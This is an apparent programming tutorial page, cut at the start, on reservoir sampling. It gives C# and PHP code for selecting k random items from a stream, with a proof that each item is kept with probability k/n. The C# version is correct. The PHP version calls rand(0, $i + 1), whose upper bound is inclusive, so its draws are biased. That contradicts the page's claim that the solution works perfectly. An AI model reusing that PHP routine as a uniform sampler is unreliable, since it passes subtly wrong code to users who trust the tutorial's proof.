select k items from a stream of items using System; using System.Collections; public class ReservoirSampling { // A function to randomly select k // items from stream[0..n-1]. static void selectKItems(int []stream, int n, int k) { // index for elements in stream[] int i; // reservoir[] is the output array. // Initialize it with first k // elements from stream[] int[] reservoir = new int[k]; for (i = 0; i < k; i++) reservoir[i] = stream[i]; Random r = new Random(); // Iterate from the (k+1)th // element to nth element for (; i < n; i++) { // Pick a random index from 0 to i. int j = r.Next(i + 1); // If the randomly picked index // is smaller than k, then replace // the element present at the index // with new element from stream if(j < k) reservoir[j] = stream[i]; } Console.WriteLine("Following are k " + "randomly selected items"); for (i = 0; i < k; i++) Console.Write(reservoir[i]+" "); } //Driver code static void Main() { int []stream = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}; int n = stream.Length; int k = 5; selectKItems(stream, n, k); } } // This code is contributed by mits chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // An efficient PHP program // to randomly select k items // from a stream of items // A utility function // to print an array function printArray($stream,$n) { for ($i = 0; $i < $n; $i++) echo $stream[$i]." "; echo "\n"; } // A function to randomly select // k items from stream[0..n-1]. function selectKItems($stream, $n, $k) { $i; // index for elements // in stream[] // reservoir[] is the output // array. Initialize it with // first k elements from stream[] $reservoir = array_fill(0, $k, 0); for ($i = 0; $i < $k; $i++) $reservoir[$i] = $stream[$i]; // Iterate from the (k+1)th // element to nth element for (; $i < $n; $i++) { // Pick a random index // from 0 to i. $j = rand(0,$i + 1); // If the randomly picked // index is smaller than k, // then replace the element // present at the index // with new element from stream if($j < $k) $reservoir[$j] = $stream[$i]; } echo "Following are k randomly ". "selected items\n"; printArray($reservoir, $k); } // Driver Code $stream = array(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12); $n = count($stream); $k = 5; selectKItems($stream, $n, $k); // This code is contributed by mits ?> chevron_right filter_none Output: Following are k randomly selected items 6 2 11 8 12 Note: Output will differ every time as it selects and prints random elements Time Complexity: O(n) How does this work? To prove that this solution works perfectly, we must prove that the probability that any item stream[i] where 0 <= i < n will be in final reservoir[] is k/n. Let us divide the proof in two cases as first k items are treated differently. Case 1: For last n-k stream items, i.e., for stream[i] where k <= i < n For every such stream item stream[i], we pick a random index from 0 to i and if the picked index is one of the first k indexes, we replace the element at picked index with stream[i] To simplify the proof, let us first consider the last item. The probability that the last item is in final reservoir = The probability that one of the first k indexes is picked for last item = k/n (the probability of picking one of the k items from a list of size n) Let us now consider the second last item. The probability that the second last item is in final reservoir[] = [Probability that one of the first k indexes is picked in iteration for stream[n-2]] X [Probability that the index picked in iteration for stream[n-1] is not same as index picked for stream[n-2] ] = [k/(n-1)]*[(n-1)/n] = k/n. Similarly, we can consider other items for all stream items from stream[n-1] to stream[k] and generalize the proof. Case 2: For first k stream items, i.e., for stream[i] where 0 <= i < k The first k items are initially copied to reservoir[] and may be removed later in iterations for stream[k] to stream[n]. The probability that an item from stream[0..k-1] is in final array = Probability that the item is not picked when items stream[k], stream[k+1], …. stream[n-1] are considered = [k/(k+1)] x [(k+1)/(k+2)] x [(k+2)/(k+3)] x … x [(n-1)/n] = k/n References: http://en.wikipedia.org/wiki/Reservoir_sampling Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Sum of Bitwise XOR of each array element with all other array elementsSmallest number greater than or equal to N which is divisible by its non-zero digitsCount odd and even Binomial Coefficients of N-th powerMake all array elements even by replacing any pair of array elements with their sumMake all array elements even by replacing adjacent pair of array elements with their sumSplit array into K subarrays with minimum sum of absolute difference between adjacent elementsPrint path from a node to root of given Complete Binary TreeMaximize the common difference of an AP having the given array as a subsequenceSum of maximum of all subarrays by adding even frequent maximum twiceMinimize the maximum difference of any pair by doubling odd elements and reducing even elements by halfSmallest number whose sum of digits is N and every digit occurring at most K timesXOR of all even numbers from a given rangeCount pairs of indices having equal prefix and suffix sumsQueries to check if sweets of given type can be eaten on given day or notImproved By : Mithun Kumar, rathbhupendra Article Tags : ArticlesMathematicalRandomized Practice Tags : Mathematical thumb_up 15 To-do Done 3.7 Based on 80 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Space and time efficient Binomial Coefficient Next last_page Significance of Pascal’s Identity Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 1 (Asymptotic Analysis)find command in Linux with examplesHow to write a Pseudo Code? Most visited in Mathematical Program for Fibonacci numbersC++ Data TypesSet in C++ Standard Template Library (STL)Write a program to print all permutations of a given stringProgram for factorial of a number room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

